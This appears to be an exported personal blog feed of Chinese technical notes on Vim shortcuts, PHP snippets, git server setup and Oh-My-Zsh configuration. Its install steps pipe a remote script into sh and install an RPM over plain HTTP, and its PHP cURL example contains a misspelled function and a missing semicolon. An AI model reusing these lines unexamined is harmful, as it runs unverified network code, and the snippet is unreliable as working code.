<td style="text-align:center"><code>&lt; C+w+o &gt;</code></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">向上轮换窗口</td>
<td style="text-align:center"><code>&lt; C+w+R &gt;</code></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">向下轮换窗口</td>
<td style="text-align:center"><code>&lt; C+w+r &gt;</code></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">窗口等宽</td>
<td style="text-align:center"><code>&lt; C+w+= &gt;</code></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">窗口最小化</td>
<td style="text-align:center"><code>&lt; C+w+1_&gt;</code></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">窗口最大化</td>
<td style="text-align:center"><code>&lt; C+w+_ &gt;</code></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">窗口向右最小化</td>
<td style="text-align:center"><code>&lt; C+w+&amp;#124; &gt;</code></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">窗口向左最小化</td>
<td style="text-align:center"><code>&lt; C+w+1&amp;#124; &gt;</code></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">新窗口打开一个buffer文件</td>
<td style="text-align:center"><code>&lt; C+w+^ &gt;</code></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">移动窗口</td>
<td style="text-align:center"><code>&lt; C+w+r &gt;</code></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">2个窗口互换</td>
<td style="text-align:center"><code>&lt; C+w+x &gt;</code></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">2个横屏变竖屏</td>
<td style="text-align:center"><code>&lt; C+w+H &gt;</code></td>
<td style="text-align:center"></td>
</tr>
<tr>
<td style="text-align:center">2个竖屏变横屏</td>
<td style="text-align:center"><code>&lt; C+w+K &gt;</code></td>
<td style="text-align:center">&emsp;</td>
</tr>
</tbody>
</table>
<h3 id="4-宏操作"><a href="#4-宏操作" class="headerlink" title="4.宏操作"></a>4.宏操作</h3><h4 id="4-1-录制宏并使用"><a href="#4-1-录制宏并使用" class="headerlink" title="4.1 录制宏并使用"></a>4.1 录制宏并使用</h4><ul>
<li>第一步：在正常模式下（非insert模式、非visual模式）按下q键盘</li>
<li>第二步：选择a-z或0-9中任意一个作为缓冲器的名字，准备开始录制宏</li>
<li>第三步：正常的操作，此次所有的操作都会被记录在上一步中定义的缓冲器中</li>
<li>第四步：在非insert模式下输入q停止宏的录制</li>
<li>第五步：使用@ + 第二步中定义的缓冲器的名字即可。  </li>
</ul>
<h4 id="4-2-录制查找修改宏"><a href="#4-2-录制查找修改宏" class="headerlink" title="4.2 录制查找修改宏"></a>4.2 录制查找修改宏</h4><ul>
<li>recording还可以和查询结合起来使用，例如想把一个文件中含有特定字符串的行注释，可以通过这样的宏来实现。在正常模式下输入/search string + enter、shift + ^、i、#、esc、shift + $。<br>让定制的宏自动执行多次的方法是先输入一个数字，然后在输入@ + 缓冲器的名字。 例如 100@t，表示执行100次</li>
</ul>
<h4 id="4-3-修改宏"><a href="#4-3-修改宏" class="headerlink" title="4.3 修改宏"></a>4.3 修改宏</h4><ul>
<li>当你发现存在某个寄存器的命令宏是错误的，你除了可以重新写一遍命令宏之外，还有如下修改方式： 1、先用G（大写）到文件末尾，然后用o（小写）新加一行，不要编辑，用ESC退出到普通模式，其实就是为编辑宏找了个地方。(或用 new 开一个新窗口) 2、使用命令 “tp会看到寄存器 t 中的命令宏像文本一样出现在这一行，然后编辑这一行。编辑的时候与vim编辑其他的文件一样。编辑结束后用0（零）回到行首。 3、然后用 “ty$ 将正确内容写到寄存器a中，最后删除这一行即可。 4、当你需要向命令宏寄存器中增加内容时，可以用命令 qA 来向 t 寄存器增加内容，之后输入你想增加的内容，再使用q结束。</li>
</ul>
<h3 id="5-文件对比"><a href="#5-文件对比" class="headerlink" title="5 文件对比"></a>5 文件对比</h3><h4 id="5-1-说明"><a href="#5-1-说明" class="headerlink" title="5.1 说明"></a>5.1 说明</h4><p>&emsp; 同linux下的diff工具命令行一样,vim叫vimdiff。用于文件的对比和修改合并。</p>
<h4 id="5-2-基本操作"><a href="#5-2-基本操作" class="headerlink" title="5.2 基本操作"></a>5.2 基本操作</h4><table>
<thead>
<tr>
<th style="text-align:center">说明</th>
<th style="text-align:center">操作</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">打开对比文件</td>
<td style="text-align:center"><code>:vimdiff &lt;filename1&gt; &lt;filename2&gt;</code>或<code>vim -d &lt;filename1&gt; &lt;filename2 &gt;</code></td>
</tr>
<tr>
<td style="text-align:center">vim中打开对比文件</td>
<td style="text-align:center"><code>:vertical diffsplit &lt;filename&gt;</code></td>
</tr>
<tr>
<td style="text-align:center">下一个差异或指定</td>
<td style="text-align:center"><code>]c</code>或<code>num]c</code></td>
</tr>
<tr>
<td style="text-align:center">上一个差异或指定</td>
<td style="text-align:center"><code>[c</code>或<code>num[c</code></td>
</tr>
<tr>
<td style="text-align:center">当前差异推送</td>
<td style="text-align:center"><code>dp</code></td>
</tr>
<tr>
<td style="text-align:center">当前差异接收</td>
<td style="text-align:center"><code>do</code></td>
</tr>
<tr>
<td style="text-align:center">刷新文件差异</td>
<td style="text-align:center"><code>:diffupdate</code></td>
</tr>
</tbody>
</table>
<p>注：<code>set noscrollbind</code>设置屏幕禁止同步滚动。</p>
<h3 id="6-文件批量操作"><a href="#6-文件批量操作" class="headerlink" title="6 文件批量操作"></a>6 文件批量操作</h3><h4 id="6-1-批量打开文件"><a href="#6-1-批量打开文件" class="headerlink" title="6.1 批量打开文件"></a>6.1 批量打开文件</h4><table>
<thead>
<tr>
<th style="text-align:center">说明</th>
<th style="text-align:center">操作</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">打开当前节点文件</td>
<td style="text-align:center"><code>:args *</code></td>
</tr>
</tbody>
</table>
<h3 id="7-跳转"><a href="#7-跳转" class="headerlink" title="7 跳转"></a>7 跳转</h3><table>
<thead>
<tr>
<th style="text-align:center">说明</th>
<th style="text-align:center">操作</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">跳到当前页变量声明处</td>
<td style="text-align:center"><code>gd</code></td>
</tr>
</tbody>
</table>
<h3 id="8-tab-标签"><a href="#8-tab-标签" class="headerlink" title="8 tab 标签"></a>8 tab 标签</h3><table>
<thead>
<tr>
<th style="text-align:center">说明</th>
<th style="text-align:center">操作</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center">调换<code>tab</code> 窗口的顺序</td>
<td style="text-align:center"><code>:tabmove &lt;number&gt;</code> 当前窗口的要排的位置，0开始</td>
</tr>
</tbody>
</table>
<h3 id="9-安装"><a href="#9-安装" class="headerlink" title="9 安装"></a>9 安装</h3><h4 id="9-1-centos-7-安装vim8-x"><a href="#9-1-centos-7-安装vim8-x" class="headerlink" title="9.1 centos 7 安装vim8.x"></a>9.1 centos 7 安装vim8.x</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">rpm -Uvh http://mirror.ghettoforge.org/distributions/gf/gf-release-latest.gf.el7.noarch.rpm</span><br><span class="line">rpm --import http://mirror.ghettoforge.org/distributions/gf/RPM-GPG-KEY-gf.el7</span><br><span class="line"></span><br><span class="line">yum -y remove vim-minimal vim-common vim-enhanced</span><br><span class="line">yum -y --enablerepo=gf-plus install vim-enhanced sudo</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>vim</category>
      </categories>
      <tags>
        <tag>vim</tag>
      </tags>
  </entry>
  <entry>
    <title>「SEO」百度SEO若干</title>
    <url>/2018/06/05/%E7%99%BE%E5%BA%A6SEO%E8%8B%A5%E5%B9%B2/</url>
    <content><![CDATA[<h3 id="禁用百度转码声明"><a href="#禁用百度转码声明" class="headerlink" title="禁用百度转码声明"></a>禁用百度转码声明</h3><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="HTML"><figure class="iseeu highlight /html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Cache-Control"</span> <span class="attr">content</span>=<span class="string">"no-transform"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Cache-Control"</span> <span class="attr">content</span>=<span class="string">"no-siteapp"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br></pre></td></tr></table></figure></div>
<a id="more"></a>
]]></content>
      <categories>
        <category>SEO</category>
      </categories>
      <tags>
        <tag>SEO</tag>
      </tags>
  </entry>
  <entry>
    <title>「php」cURL学习笔记</title>
    <url>/2018/06/03/cURL%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h4 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h4><p>&emsp;cURL官方义:cURL is a command line tool for transfering data whith URL syntax (使用URL语法传输数据的命令行工具)。</p>
<h4 id="简单示例"><a href="#简单示例" class="headerlink" title="简单示例"></a>简单示例</h4><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *获取百度html页面</span></span><br><span class="line"><span class="comment"> *<span class="doctag">@return</span> string $html</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getHtml</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $url = <span class="string">'http://www.baidu.com'</span></span><br><span class="line">    $ch   = curl_init();</span><br><span class="line">    curl_opset($ch,CURLOPT_URL,$url);</span><br><span class="line">    curl_opset($ch,CURLOPT_RETURNTRANSFER,<span class="keyword">true</span>);<span class="comment">//不打印</span></span><br><span class="line">    $html = curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">    <span class="keyword">return</span> $html;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
<a id="more"></a>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php算法</tag>
      </tags>
  </entry>
  <entry>
    <title>「php」php正则</title>
    <url>/2018/05/31/php%E6%AD%A3%E5%88%99/</url>
    <content><![CDATA[<p>1,验证中文<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">preg_match(<span class="string">'/^([\x&#123;4e00&#125;-\x&#123;9fa5&#125;]&#123;2,&#125;)$/u'</span>,<span class="string">'&lt;被验证中文字符串&gt;'</span>) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br></pre></td></tr></table></figure></div></p>
<p>2，手机号<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">/^((<span class="number">13</span>[<span class="number">0</span><span class="number">-9</span>])|(<span class="number">14</span>[<span class="number">5</span>,<span class="number">7</span>])|(<span class="number">15</span>[<span class="number">0</span><span class="number">-3</span>,<span class="number">5</span><span class="number">-9</span>])|(<span class="number">17</span>[<span class="number">0</span>,<span class="number">3</span>,<span class="number">5</span><span class="number">-8</span>])|(<span class="number">18</span>[<span class="number">0</span><span class="number">-9</span>])|<span class="number">166</span>|<span class="number">198</span>|<span class="number">199</span>)\d&#123;<span class="number">8</span>&#125;$/</span><br></pre></td></tr></table></figure></div></p>
<p>3，2位小数<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line">/^[<span class="number">0</span><span class="number">-9</span>]+(.[<span class="number">0</span><span class="number">-9</span>]&#123;<span class="number">1</span>,<span class="number">2</span>&#125;)?$/</span><br></pre></td></tr></table></figure></div></p>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php正则</tag>
      </tags>
  </entry>
  <entry>
    <title>「前端」jqury-confirm提示插件笔记</title>
    <url>/2018/05/29/jqury-confirm%E6%8F%90%E7%A4%BA%E6%8F%92%E4%BB%B6%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="1-说明"><a href="#1-说明" class="headerlink" title="1.说明"></a>1.说明</h3><p>  <span class="exturl" data-url="aHR0cDovL2NyYWZ0cGlwLmdpdGh1Yi5pby9qcXVlcnktY29uZmlybS8=" title="http://craftpip.github.io/jquery-confirm/">jqury-confirm<i class="fa fa-external-link"></i></span>是一款web页面美化提示框的插件。依赖于<span class="exturl" data-url="aHR0cHM6Ly9qcXVlcnkuY29t" title="https://jquery.com">jquery<i class="fa fa-external-link"></i></span>。<br>下载:<br>  &emsp; <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2NyYWZ0cGlwL2pxdWVyeS1jb25maXJt" title="https://github.com/craftpip/jquery-confirm">github下载<i class="fa fa-external-link"></i></span><br>  &emsp; <span class="exturl" data-url="aHR0cDovL3Fpbml1Lnd1Y2h1aGVuZy5jb20vanF1ZXJ5LWNvbmZpcm0tdjMuMy4wLnppcA==" title="http://qiniu.wuchuheng.com/jquery-confirm-v3.3.0.zip">本站V3.3.0.zip下载<i class="fa fa-external-link"></i></span></p>
<h3 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h3><a id="more"></a>
<script href="”/library/static/js/jquery-confirm-master/dist/jquery-confirm.min.js”"></script>
<link ref="”stylesheet”" src="”/library/static/js/jquery-confirm-master/dist/jquery-confirm.min.css”">

<script>

</script>
]]></content>
      <categories>
        <category>前端</category>
      </categories>
      <tags>
        <tag>javascript</tag>
      </tags>
  </entry>
  <entry>
    <title>「linux」git学习笔记-搭建仓库</title>
    <url>/2018/05/25/git%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E6%90%AD%E5%BB%BA%E4%BB%93%E5%BA%93/</url>
    <content><![CDATA[<h4 id="1-关于git的一点猜测"><a href="#1-关于git的一点猜测" class="headerlink" title="1,关于git的一点猜测"></a>1,关于git的一点猜测</h4><p>使用git后一回头，这条命令肿么看着眼熟<code>git clone [user]@[domain]:[path]</code>。<br>跟以前用的<code>scp [-r] [user]@[domain]:[path]</code>好像。也许git是基于ssh来通信，<br>连接远程的主机。就像shell,远程的git命令也会在远程主机中执行。<br><a id="more"></a></p>
<h4 id="2-创建远程仓库和用户名"><a href="#2-创建远程仓库和用户名" class="headerlink" title="2,创建远程仓库和用户名"></a>2,创建远程仓库和用户名</h4><p>注:先确保已经安装了git。<br> <code>sudo adduser git</code> 创建git用户<br> <div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">mkdir -p /home/git/repository/demo.git; <span class="comment">#创建demo.git目录用于存放项目</span></span><br><span class="line"><span class="built_in">cd</span> /home/git/repository; </span><br><span class="line">chown -R git:git ../repository;</span><br><span class="line">git init --bare demo.git;  <span class="comment"># git初始化空目录</span></span><br></pre></td></tr></table></figure></div></p>
<h4 id="3-连接仓库"><a href="#3-连接仓库" class="headerlink" title="3,连接仓库"></a>3,连接仓库</h4><p>提交本地公钥:<code>ssh-copy-id &lt;username&gt;@&lt;remotehost&gt;</code><br>在git上输入<code>git clone git@[domain]:/home/git/repository/demo.git</code>将远程的demo<br>项目克隆下来开发。</p>
<h4 id="4-禁用git帐户登录远程主机的bash"><a href="#4-禁用git帐户登录远程主机的bash" class="headerlink" title="4,禁用git帐户登录远程主机的bash"></a>4,禁用git帐户登录远程主机的bash</h4><p>修改/etc/passwd文件<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">git:x:1004:1004::/home/git:/bin/shell <span class="comment"># 改为</span></span><br><span class="line">git:x:1004:1004::/home/git:/usr/bin/git-shell</span><br></pre></td></tr></table></figure></div></p>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>git笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>「php」php数据验证类</title>
    <url>/2018/05/23/php%E6%95%B0%E6%8D%AE%E9%AA%8C%E8%AF%81%E7%B1%BB/</url>
    <content><![CDATA[<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">validate</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     *校对上次数据是当前参数一致</span></span><br><span class="line"><span class="comment">     *<span class="doctag">@param</span> unknown param</span></span><br><span class="line"><span class="comment">     *<span class="doctag">@return</span> boolean</span></span><br><span class="line"><span class="comment">     *@注：当前的session命名有问题，当另外的方法调用时会出现判</span></span><br><span class="line"><span class="comment">     断不正确，应该结合如debug_stack()来定义唯一的变量名称</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isNewParam</span><span class="params">($param)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>($_SESSION[<span class="string">'prevData'</span>] !== $param <span class="keyword">OR</span> <span class="keyword">empty</span>($_SESSION[<span class="string">'prevData'</span>])) &#123;</span><br><span class="line">            $_SESSION[<span class="string">'isNewParam'</span>] = <span class="keyword">true</span>;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $_SESSION[<span class="string">'isNewParam'</span>] = <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        $_SESSION[<span class="string">'prevData'</span>] = $param;</span><br><span class="line">        <span class="keyword">if</span>($_SESSION[<span class="string">'isNewParam'</span>] === <span class="keyword">false</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>; </span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php算法</tag>
      </tags>
  </entry>
  <entry>
    <title>【linux】Oh-My-Zsh使用笔记</title>
    <url>/2018/05/22/%E3%80%90linux%E3%80%91Oh%20My%20Zsh%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<h3 id="本地环境参数"><a href="#本地环境参数" class="headerlink" title="本地环境参数"></a>本地环境参数</h3><table>
<thead>
<tr>
<th style="text-align:left">参数</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>OS</code></td>
<td style="text-align:left"><code>windows10</code></td>
</tr>
<tr>
<td style="text-align:left"><code>Terminal</code></td>
<td style="text-align:left"><code>gitbash</code></td>
</tr>
<tr>
<td style="text-align:left"><code>线上机OS</code></td>
<td style="text-align:left"><code>centos7.6</code></td>
</tr>
</tbody>
</table>
<h3 id="线上环境参数"><a href="#线上环境参数" class="headerlink" title="线上环境参数"></a>线上环境参数</h3><table>
<thead>
<tr>
<th style="text-align:left">参数</th>
<th style="text-align:left">说明</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left"><code>OS</code></td>
<td style="text-align:left"><code>centos7.6</code></td>
</tr>
<tr>
<td style="text-align:left"><code>git</code></td>
<td style="text-align:left">这个是必备的</td>
</tr>
<tr>
<td style="text-align:left"><code>zsh</code></td>
<td style="text-align:left">已安装<code>zsh</code>,并<code>sudo  chsh -s /bin/zsh &lt;username&gt;</code> 默认为登录<code>sh</code></td>
</tr>
</tbody>
</table>
<h2 id="1-安装"><a href="#1-安装" class="headerlink" title="1 安装"></a>1 安装</h2><ul>
<li><p>curl</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>"</span></span><br></pre></td></tr></table></figure></div>
</li>
<li><p>wget</p>
<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)</span>"</span></span><br></pre></td></tr></table></figure></div>
</li>
</ul>
<a id="more"></a>
<h2 id="2-配置"><a href="#2-配置" class="headerlink" title="2 配置"></a>2 配置</h2><h3 id="2-1-主题"><a href="#2-1-主题" class="headerlink" title="2.1 主题"></a>2.1 主题</h3><p> 安装字体<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3J5YW5vYXNpcy9uZXJkLWZvbnRzL3JlbGVhc2VzL2Rvd25sb2FkL3YyLjAuMC9Tb3VyY2VDb2RlUHJvLnppcA==" title="https://github.com/ryanoasis/nerd-fonts/releases/download/v2.0.0/SourceCodePro.zip">SauceCodePro Nerd Font Mono<i class="fa fa-external-link"></i></span>。<code>windowns</code>系统直接下载复制到<code>c://windows/fonts</code>下.在本地<code>.~/.minttyrc</code> 文件加入 <code>Font=SauceCodePro Nerd Font Mono</code> 用于指定默认这个字体.  </p>
<p> 回到线上机, 在<code>~/.zshrc</code> 修改参数<code>ZSH_THEME=&quot;agnoster&quot;</code>,这里指定的主题为<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Fnbm9zdGVyL2Fnbm9zdGVyLXpzaC10aGVtZQ==" title="https://github.com/agnoster/agnoster-zsh-theme"><code>agnoster</code><i class="fa fa-external-link"></i></span> , <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2Fnbm9zdGVyL2Fnbm9zdGVyLXpzaC10aGVtZQ==" title="https://github.com/agnoster/agnoster-zsh-theme">这是仓库<i class="fa fa-external-link"></i></span>.<br> &emsp;然后输入<code>source ~/.zshrc</code>重新加载配置， 使用主题生效</p>
<h3 id="2-2-插件"><a href="#2-2-插件" class="headerlink" title="2.2 插件"></a>2.2 插件</h3><h4 id="2-2-1-安装命令自动提示插件"><a href="#2-2-1-安装命令自动提示插件" class="headerlink" title="2.2.1 安装命令自动提示插件"></a>2.2.1 安装命令自动提示插件</h4><pre><code>下载`git clone https://github.com/zsh-users/zsh-autosuggestions ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-autosuggestions
</code></pre><p><code>插件下来后，在</code>~/.zshrc<code>的</code>plugins加入<code>zsh-autosuggestions</code>:<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">plugins=(git ....... zsh-autosuggestions)</span><br></pre></td></tr></table></figure></div></p>
<p>注:如果命令提示颜色没有明暗区分，就在<code>~/.zshrc</code>加入<br><div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">TERM=xterm-256color VIEWS=168374</span><br></pre></td></tr></table></figure></div></p>
<p>更多资料去官方<span class="exturl" data-url="aHR0cHM6Ly9hc2NpaW5lbWEub3JnL2EvMzczOTA=" title="https://asciinema.org/a/37390">文档<i class="fa fa-external-link"></i></span>看吧.</p>
<h4 id="2-2-2-命令行高亮"><a href="#2-2-2-命令行高亮" class="headerlink" title="2.2.2 命令行高亮"></a>2.2.2 命令行高亮</h4><p> 还是跟上面的一样，先把插件复制下来<code>git clone https://github.com/zsh-users/zsh-syntax-highlighting.git ${ZSH_CUSTOM:-~/.oh-my-zsh/custom}/plugins/zsh-syntax-highlighting</code><br> &emsp; 然后在<code>~/.zshrc</code> 的<code>plugin</code>里加入<code>zsh-syntax-highlighting</code><br> <div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">plugins=( git ... zsh-syntax-highlighting)</span><br></pre></td></tr></table></figure></div></p>
<p> 最后重载下配置<code>source ~/.zshrc</code>。</p>
<p>来源：</p>
<ul>
<li>1.<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JvYmJ5cnVzc2VsbC9vaC1teS16c2g=" title="https://github.com/robbyrussell/oh-my-zsh">github<i class="fa fa-external-link"></i></span><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3JvYmJ5cnVzc2VsbC9vaC1teS16c2g=" title="https://github.com/robbyrussell/oh-my-zsh">https://github.com/robbyrussell/oh-my-zsh<i class="fa fa-external-link"></i></span></li>
<li>2.<span class="exturl" data-url="aHR0cDovL29obXl6LnNoLw==" title="http://ohmyz.sh/">官方网站<i class="fa fa-external-link"></i></span><span class="exturl" data-url="aHR0cDovL29obXl6LnNoLw==" title="http://ohmyz.sh/">http://ohmyz.sh/<i class="fa fa-external-link"></i></span><!--more--></li>
</ul>
]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title>「php」php安全类</title>
    <url>/2018/05/22/php%E5%AE%89%E5%85%A8%E7%B1%BB/</url>
    <content><![CDATA[<div class="highlight-wrap" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true" data-rel="PHP"><figure class="iseeu highlight /php"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">safety</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *访问时间间隔判断</span></span><br><span class="line"><span class="comment"> *<span class="doctag">@param</span>  array ['secondLimit' =&gt; int]</span></span><br><span class="line"><span class="comment"> *<span class="doctag">@return</span>  boolean true 当前访问已过倒计时 false反之</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isTimeLimit</span><span class="params">($param)</span></span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    $isPass = <span class="keyword">empty</span>($_SESSION[<span class="string">'submitTime'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($_SESSION[<span class="string">'submitTime'</span>]) <span class="keyword">OR</span> $_SESSION[<span class="string">'submitTime'</span>] &gt; time()) &#123;</span><br><span class="line">        $_SESSION[<span class="string">'submitTime'</span>] = time();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(time() - $_SESSION[<span class="string">'submitTime'</span>] &lt; $param[<span class="string">'secondLimit'</span>] &amp;&amp; !$isPass) &#123;</span><br><span class="line">       <span class="keyword">return</span> <span class="keyword">false</span>;        </span><br><span class="line">   &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        $_SESSION[<span class="string">'submitTime'</span>] = time();</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php算法</tag>
      </tags>
  </entry>
  <entry>
    <title>「Vim」spf13-vim快捷键</title>
    <url>/2018/05/18/spf13-vim%E5%BF%AB%E6%8D%B7%E9%94%AE/</url>
    <content><![CDATA[<h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><h3 id="Requirements"><a href="#Requirements" class="headerlink" title="Requirements"></a>Requirements</h3><p>事实上只需在Vim里<code>:help plugin_name</code>就可以查看帮助内容，我只是为自己常用的做个速查。<br>To make all the plugins work, specifically <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Nob3Vnby9uZW9jb21wbGV0ZS52aW0=" title="https://github.com/Shougo/neocomplete.vim">neocomplete<i class="fa fa-external-link"></i></span>, you need <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1Nob3Vnby9uZW9jb21wbGV0ZS52aW0jcmVxdWlyZW1lbnRz" title="https://github.com/Shougo/neocomplete.vim#requirements">vim with lua<i class="fa fa-external-link"></i></span>.</p>
